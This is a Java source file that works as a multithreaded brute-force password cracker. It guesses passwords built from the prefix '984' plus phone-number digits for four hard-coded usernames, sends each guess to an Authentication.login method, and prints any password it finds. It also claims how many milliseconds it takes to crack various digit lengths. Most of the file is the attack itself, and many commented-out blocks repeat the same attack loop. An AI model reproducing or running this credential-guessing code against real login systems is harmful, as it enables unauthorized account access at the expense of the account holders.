package login;


import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import com.fm.login.Authentication;

public class SampleTask implements Runnable{
	
	private  int min;
	private  String name;
	private int max;
	Boolean result = false;

	public SampleTask() {
		
	}
	SampleTask(int min, String name, int max) {
		this.min = min;
		this.name = name;
		this.max = max;
	}
	@Override
	public void run() {
		
		String password1= "";
		
		int minimum = min;
		Authentication a = new Authentication();
		
		
			while (result != true && minimum < max){
				
				
				
				password1 = "984" + Integer.toString(++minimum);
				result = a.login(name, password1);
				
				//System.out.println(password1 + "\t" + name);
				
				//result = a.login(names[i], password1);
			} 
			if(result == true) {
				System.out.println("Password Found:  " + password1 +"\t" + name);
				System.out.println(System.currentTimeMillis() + " \t  :: Ending  time");

			}else {
				System.out.println("Password not found for : \t " + name + " from  \t "+ min +" to \t "+ max);
			}
		
	
	}
	public static void main (String[] args ) throws InterruptedException {
		
		try {

		System.out.println(System.currentTimeMillis() + " \t  :: Starting time");
		
		String[] names = {"roshan", "ram", "sita", "prajwal"};
		int startingValue = 0 , endingValue = 0 ;
		
		System.out.println("finds the last 4 digits of phone no  in  45,000 miliseconds");
		System.out.println("finds the last 5 digits of phone no  in  160,000 miliseconds");
		System.out.println("finds the last 6 digits of phone no  in  160,000 miliseconds");
		
		Boolean choose = false;
		
		while(choose == false){
			
		
		Scanner in = new Scanner(System.in);
		System.out.println("Enter starting value of last 7 digits of phone no");
		String start = in.nextLine();
		
		System.out.println("Enter ending value of last 7 digits of phone no");
		Scanner in1 = new Scanner(System.in);
		String end = in1.nextLine();
		
		if(start.length() == 7 && end.length() == 7) {
		startingValue = Integer.parseInt(start);
		endingValue = Integer.parseInt(end);
		SampleTask task = new  SampleTask();
		task.check(startingValue, names, endingValue);
//		SampleTask task = new  SampleTask();
//		int i = 1000000;
//		for(int in = i; i< 1099999 ; in+=40000) {
//		task.check(in, names, in+40000);
//		in++;
//		}
		}
		else {
			System.out.println("Input the given range having 7 last  digits of phone number ");
		}
		
		
		choose = true;
		in.close();
		in1.close();
		}
		
		System.out.println("Wait the system is running");
		}
		catch(Exception e) {
			System.out.println("Wait system is running result will come ");
			
		}
		
		
		
		
		
//		ExecutorService executor = Executors.newFixedThreadPool(50);
//		for(int i = 0; i< names.length ; i++) {
//		executor.execute(new SampleTask(110000, names[i]));
//		executor.awaitTermination(1000, TimeUnit.MILLISECONDS);
//		
//		}
//		for(int i = 0; i< names.length ; i++) {
//			ExecutorService executor1 = Executors.newFixedThreadPool(50);
//			executor1.execute(new SampleTask(120000, names[i]));
//			executor1.awaitTermination(1000, TimeUnit.MILLISECONDS);
//			
//			}
//		for(int i = 0; i< names.length ; i++) {
//			ExecutorService executor2 = Executors.newFixedThreadPool(50);
//			executor2.execute(new SampleTask(130000, names[i]));
//			executor2.awaitTermination(1000, TimeUnit.MILLISECONDS);
//			
//			}
//		for(int i = 0; i< names.length ; i++) {
//			ExecutorService executor3 = Executors.newFixedThreadPool(50);
//			executor3.execute(new SampleTask(140000, names[i]));
//			executor3.awaitTermination(1000, TimeUnit.MILLISECONDS);
//			
//			}
//		for(int i = 0; i< names.length ; i++) {
//			ExecutorService executor4 = Executors.newFixedThreadPool(50);
//			executor4.execute(new SampleTask(150000, names[i]));
//			executor4.awaitTermination(1000, TimeUnit.MILLISECONDS);
//			
//			}
//		for(int i = 0; i< names.length ; i++) {
//			ExecutorService executor5 = Executors.newFixedThreadPool(50);
//			executor5.execute(new SampleTask(160000, names[i]));
//			executor5.awaitTermination(1000, TimeUnit.MILLISECONDS);
//			
//			}
//		for(int i = 0; i< names.length ; i++) {
//			ExecutorService executor6 = Executors.newFixedThreadPool(50);
//			executor6.execute(new SampleTask(170000, names[i]));
//			executor6.awaitTermination(1000, TimeUnit.MILLISECONDS);
//			
//			}
//		ExecutorService executor7 = Executors.newFixedThreadPool(50);
//		for(int i = 0; i< names.length ; i++) {
//			
//			executor7.execute(new SampleTask(880000, names[i]));
//			executor7.awaitTermination(10, TimeUnit.MILLISECONDS);
//			
//			}
//		for(int i = 0; i< names.length ; i++) {
//			ExecutorService executor8= Executors.newFixedThreadPool(50);
//			executor8.execute(new SampleTask(190000, names[i]));
//			executor8.awaitTermination(1000, TimeUnit.MILLISECONDS);
//			
//			}
		
//		for(int i = 0; i< names.length ; i++) {
//			executor.execute(new SampleTask(8000000, names[i]));
//			executor.awaitTermination(1000, TimeUnit.MILLISECONDS);
//			
//		}
//		for(int i = 0; i< names.length ; i++) {
//			executor.execute(new SampleTask(9000000, names[i]));
//			executor.awaitTermination(1000, TimeUnit.MILLISECONDS);
//			
//		}
		
		//executor7.shutdown();
	
		
		
//		executor.execute(new SampleTask(8000000, "sita"));
//		executor.shutdown();
		
//		Thread t1 = new Thread(st1);
//		Thread t2 = new Thread(st2);
//		t1.start();
//		t2.start();
		//t2.interrupt();
		//t1.interrupt();
	}
	public void check( int startingValue, String[] names, int endingValue) throws InterruptedException {
		
		
		
		
				ExecutorService executor7 = Executors.newFixedThreadPool(50);
		for(int i = 0; i< names.length ; i++) {
			
			executor7.execute(new SampleTask(startingValue, names[i], endingValue));
			executor7.awaitTermination(1, TimeUnit.MILLISECONDS);
//			String name = names[i];
//			for( int startValue = startingValue ; startingValue <= endingValue ; startingValue += 10000 ) {
//			SampleTask task = new SampleTask(startValue , name , startingValue + 10000);
//			Thread t1 = new Thread(task );
//			executor7.execute(t1);
//			executor7.awaitTermination(1, TimeUnit.MILLISECONDS);
//			}
//			i = i+1;
			
			}
		executor7.shutdown();
	}
}
